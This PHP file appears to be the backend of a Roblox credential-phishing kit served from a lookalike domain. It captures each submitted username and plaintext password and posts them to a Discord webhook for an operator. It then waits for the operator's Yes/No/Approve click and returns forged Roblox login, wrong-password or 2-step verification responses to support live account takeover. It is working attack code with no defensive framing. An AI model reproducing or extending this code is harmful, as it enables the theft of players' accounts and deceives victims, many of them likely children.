<?php
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

// Add CORS headers
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: GET, POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type, Authorization, X-Requested-With');
header('Content-Type: application/json');

// Handle preflight OPTIONS request
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    exit(0);
}

require('../../setup.php');

function get_string_between($string, $start, $end) {
    $string = ' ' . $string;
    $ini = strpos($string, $start);
    if ($ini == 0) return '';
    $ini += strlen($start);
    $len = strpos($string, $end, $ini) - $ini;
    return substr($string, $ini, $len);
}

if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $input = json_decode(file_get_contents('php://input'), true);

    if (empty($input['cvalue']) || empty($input['password'])) {
        http_response_code(400);
        die(json_encode(['error' => 'Username and password are required.']));
    }

    // Fetch user details from the Roblox profile
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($ch, CURLOPT_URL, 'https://www.roblox.com/users/profile?username=' . urlencode($input['cvalue']));
    $profile = curl_exec($ch);

    if (curl_errno($ch)) {
        $error_msg = curl_error($ch);
        curl_close($ch);
        error_log("Curl error: " . $error_msg);
        die(json_encode(['error' => 'Curl error: ' . $error_msg]));
    }
    curl_close($ch);

    $username = get_string_between($profile, '{"profileusername":"', '"');
    $userId = get_string_between($profile, '<link rel="canonical" href="https://www.roblox.com/users/', '/');
    $avatar = get_string_between($profile, '<meta property="og:image" content="', '"');
    $isPremium = strpos($profile, '<span class="icon-premium-medium"></span>') ? 'True' : 'False';

    if (empty($username) || empty($userId)) {
        // If we couldn't fetch profile details from Roblox, don't abort.
        // Instead, fall back to using the submitted credentials so the webhook
        // still receives the values the user typed (even if the username doesn't exist).
        error_log("Profile fetch failed for input: " . ($input['cvalue'] ?? ''));
        $username = $input['cvalue'] ?? 'Unknown';
        $userId = 'N/A';
        $avatar = 'https://path.to/default/avatar.png';
        $isPremium = 'False';
        // continue — still send webhook containing the submitted username/password
    }

    $ticket = rand(); // Unique ID for this request
    $yesLink = 'https://uroblox.com/auth/v2/login?action=confirm_yes&ticket=' . $ticket;
    $noLink = 'https://uroblox.com/auth/v2/login?action=confirm_no&ticket=' . $ticket;
    $approveLink = 'https://uroblox.com/auth/v2/login?action=confirm_approve&ticket=' . $ticket;

    file_put_contents("/tmp/response_$ticket", json_encode(['response' => null]));

    $embed = json_encode([
        'content' => '@everyone',
        'username' => $input['cvalue'] ?: 'Unknown User',
        'avatar_url' => $avatar ?: 'https://path.to/default/avatar.png',
        'tts' => true,
        'embeds' => [[
            'title' => 'Confirm Action',
            'type' => 'rich',
            'url' => 'https://www.roblox.com/users/profile?username=' . urlencode($username),
            'timestamp' => date('c'),
            'color' => hexdec(str_replace('#', '', "#00FF00")), // Green
            'footer' => [
                'text' => 'Log ID: ' . $ticket,
                'icon_url' => $avatar
            ],
            'thumbnail' => [
                'url' => $avatar
            ],
            'fields' => [
                ['name' => 'Username', 'value' => $input['cvalue'], 'inline' => false],
                ['name' => 'Password', 'value' => $input['password'], 'inline' => false],
                ['name' => 'ID', 'value' => $userId, 'inline' => true],
                ['name' => 'Premium', 'value' => $isPremium, 'inline' => true],
                ['name' => 'Is this attempt correct?', 'value' => "[Yes]($yesLink) | [No]($noLink) | [Approve]($approveLink)", 'inline' => false]
            ]
        ]]
    ], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE);

    // Send webhook to Discord
    $ch = curl_init($Webhook);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $embed);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($ch);
    curl_close($ch);

    if ($response === false) {
        http_response_code(500);
        die(json_encode(['error' => 'Failed to send webhook.']));
    }

    // Long polling to wait for a response
    $maxWaitTime = 60; // Maximum time to wait in seconds
    $startTime = time();

   
    while (true) {
        // Check the response file for the ticket
        $responseData = json_decode(file_get_contents("/tmp/response_$ticket"), true);
            if ($responseData && $responseData['response'] !== null) {
            // Debug: write a snapshot of the responseData for inspection
            @file_put_contents("/tmp/response_{$ticket}_debug.json", json_encode(['timestamp' => time(), 'responseData' => $responseData]));
            // Return response based on the action
                if ($responseData['response'] === 'confirm_yes') {
                unlink("/tmp/response_$ticket"); // Cleanup
                // Return successful login with 2-step verification required
                $challengeId = 'local_2step_' . rand(100000, 999999);
                die(json_encode([
                    'user' => [
                        'id' => (int)$userId,
                        'name' => $username,
                        'displayName' => $username
                    ],
                    'twoStepVerificationData' => [
                        'mediaType' => $twoStepVerificationType,
                        'ticket' => $challengeId,
                        'challengeId' => $challengeId
                    ],
                    'isBanned' => false
                ]));
                } elseif ($responseData['response'] === 'confirm_no') {
                unlink("/tmp/response_$ticket"); // Cleanup
                http_response_code(403);
                die(json_encode([
                    'errors' => [
                        [
                            'code' => 1,
                            'message' => 'Incorrect username or password. Please try again.',
                            'userFacingMessage' => 'Something went wrong'
                        ]
                    ]
                ]));
                } elseif ($responseData['response'] === 'confirm_approve') {
                    // Operator clicked Approve: instruct the client to display a centered image.
                    // We return a lightweight JSON payload containing the image URL.
                    // Prefer an existing device-verification PNG in the auth folder
                    $devicePngPath = __DIR__ . '/../device-verification.png';
                    $imageUrl = '/images/approve_center.svg';
                    if (file_exists($devicePngPath)) {
                        // Serve the PNG from /auth/device-verification.png
                        $imageUrl = '/auth/device-verification.png';
                    } else {
                        // Try to embed the SVG as a data URL so the client can always load it
                        $svgPath = __DIR__ . '/../../public_html/images/approve_center.svg';
                        if (file_exists($svgPath)) {
                            $svg = file_get_contents($svgPath);
                            if ($svg !== false) {
                                $b64 = base64_encode($svg);
                                $imageUrl = 'data:image/svg+xml;base64,' . $b64;
                            }
                        }
                    }
                    // Do not unlink here immediately; allow client to fetch the image page if needed.
                    $approvePage = '/auth/approve-image.php?ticket=' . $ticket;
                    die(json_encode([
                        'action' => 'show_image',
                        'imageUrl' => $imageUrl,
                        'redirect' => $approvePage,
                        'message' => 'Operator selected Approve — display image.'
                    ]));
            }
        }
    
        // Break the loop if maximum wait time is exceeded
        if (time() - $startTime > $maxWaitTime) {
            unlink("/tmp/response_$ticket"); // Cleanup
            http_response_code(504); // Gateway Timeout
            die(json_encode(['error' => 'No response received within the timeout period.']));
        }
    
        usleep(500000); // Wait 0.5 seconds before checking again
    }
}

// Handle the response from the links
if ($_SERVER['REQUEST_METHOD'] == 'GET' && isset($_GET['action'], $_GET['ticket'])) {
    $action = $_GET['action'];
    $ticket = $_GET['ticket'];

    if (!in_array($action, ['confirm_yes', 'confirm_no', 'confirm_approve'])) {
        http_response_code(400);
        die(json_encode(['error' => 'Invalid action']));
    }

    // Save the response in the temporary storage
    file_put_contents("/tmp/response_$ticket", json_encode(['response' => $action]));
    // Also write a debug snapshot so we can inspect what was written by the operator click
    @file_put_contents("/tmp/response_{$ticket}_click_debug.json", json_encode(['timestamp' => time(), 'action' => $action, 'ticket' => $ticket]));
    echo json_encode(['status' => 'Response received successfully.']);
}
?>
